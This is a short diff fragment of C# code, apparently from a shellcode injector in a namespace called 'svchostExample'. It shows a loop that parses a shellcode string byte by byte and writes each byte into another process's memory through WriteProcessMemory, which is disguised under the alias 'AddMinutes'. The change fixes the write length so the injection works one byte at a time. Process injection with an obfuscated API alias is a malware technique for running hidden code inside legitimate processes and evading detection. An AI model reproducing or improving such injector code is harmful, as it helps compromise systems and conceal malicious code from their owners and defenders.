@@ -52,7 +52,7 @@ namespace svchostExample
             {
                 buffer = scode.Substring(jumpPos, 3);
    					    data[0] = Byte.Parse(buffer);
-                result = AddMinutes(pi.hProcess, allocMemAddress, data, scodeLength, out bytesWritten); // WriteProcessMemory
+                result = AddMinutes(pi.hProcess, allocMemAddress, data, 1, out bytesWritten); // WriteProcessMemory
                 allocMemAddress = allocMemAddress + 1;
      					  jumpPos = jumpPos + 4;
      			  }
